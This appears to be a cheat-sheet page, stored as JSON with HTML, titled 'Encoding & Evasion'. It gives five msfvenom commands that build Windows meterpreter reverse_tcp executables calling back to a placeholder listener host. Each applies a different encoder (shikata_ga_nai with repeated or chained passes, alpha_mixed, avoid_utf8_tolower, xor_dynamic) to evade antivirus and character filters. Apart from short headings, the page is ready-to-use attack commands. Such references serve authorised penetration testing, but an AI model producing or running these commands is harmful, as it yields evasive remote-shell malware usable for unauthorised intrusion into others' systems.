{"title": "Encoding & Evasion", "source": "msfvenom", "source_label": "msfvenom", "path": "evasion/encoding", "html": "<h1 id=\"encoding-evasion\">Encoding &amp; Evasion</h1>\n<h2 id=\"shikata_ga_nai-polymorphic-xor-most-common\">shikata_ga_nai — polymorphic XOR (most common)</h2>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/meterpreter/reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span>&lt;port&gt;<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>-e<span class=\"w\"> </span>x86/shikata_ga_nai<span class=\"w\"> </span>-i<span class=\"w\"> </span><span class=\"m\">5</span><span class=\"w\"> </span>-f<span class=\"w\"> </span>exe<span class=\"w\"> </span>&gt;<span class=\"w\"> </span>encoded.exe\n</code></pre></div>\n<h2 id=\"chained-encoding-multiple-passes\">Chained encoding (multiple passes)</h2>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/meterpreter/reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span>&lt;port&gt;<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>-e<span class=\"w\"> </span>x86/shikata_ga_nai<span class=\"w\"> </span>-i<span class=\"w\"> </span><span class=\"m\">3</span><span class=\"w\"> </span>-e<span class=\"w\"> </span>x86/call4_dword_xor<span class=\"w\"> </span>-i<span class=\"w\"> </span><span class=\"m\">2</span><span class=\"w\"> </span>-f<span class=\"w\"> </span>exe<span class=\"w\"> </span>&gt;<span class=\"w\"> </span>chained.exe\n</code></pre></div>\n<h2 id=\"alpha-numeric-bypasses-character-filters\">Alpha-numeric — bypasses character filters</h2>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/meterpreter/reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span>&lt;port&gt;<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>-e<span class=\"w\"> </span>x86/alpha_mixed<span class=\"w\"> </span>-f<span class=\"w\"> </span>exe<span class=\"w\"> </span>&gt;<span class=\"w\"> </span>alpha.exe\n</code></pre></div>\n<h2 id=\"avoid-utf-8-tolower-transforms\">Avoid UTF-8 tolower transforms</h2>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/meterpreter/reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span>&lt;port&gt;<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>-e<span class=\"w\"> </span>x86/avoid_utf8_tolower<span class=\"w\"> </span>-f<span class=\"w\"> </span>exe<span class=\"w\"> </span>&gt;<span class=\"w\"> </span>utf8safe.exe\n</code></pre></div>\n<h2 id=\"dynamic-xor-key\">Dynamic XOR key</h2>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>windows/meterpreter/reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=</span>&lt;ip&gt;<span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=</span>&lt;port&gt;<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">  </span>-e<span class=\"w\"> </span>x86/xor_dynamic<span class=\"w\"> </span>-f<span class=\"w\"> </span>exe<span class=\"w\"> </span>&gt;<span class=\"w\"> </span>xor.exe\n</code></pre></div>", "excerpt": "Encoding &amp; Evasion shikata_ga_nai — polymorphic XOR (most common) msfvenom -p windows/meterpreter/reverse_tcp LHOST = &lt;ip&gt; LPORT = &lt;port&gt; \\ -e x86/shikata_ga_nai -i 5 -f exe &gt; encoded.exe Chained encoding (multiple passes)…", "tags": []}